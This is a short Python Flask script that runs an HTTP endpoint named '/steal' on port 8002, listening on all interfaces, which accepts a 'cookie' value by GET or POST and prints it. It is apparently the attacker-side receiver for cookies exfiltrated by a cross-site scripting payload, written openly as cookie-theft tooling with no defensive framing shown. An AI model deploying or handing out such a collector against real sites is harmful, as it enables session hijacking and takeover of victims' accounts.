from flask import Flask, request

app = Flask(__name__)


@app.route('/steal', methods=['GET', 'POST'])
def steal_cookie():
    if request.method == 'GET':
        cookie = request.args.get('cookie', '')
    else:
        cookie = request.form.get('cookie', '')
    
    if cookie:
        print(f"cookie: {cookie}")
    
    return '', 204


if __name__ == '__main__':
    print("Endpoint: http://127.0.0.1:8002/steal")
    
    app.run(host='0.0.0.0', port=8002, debug=False)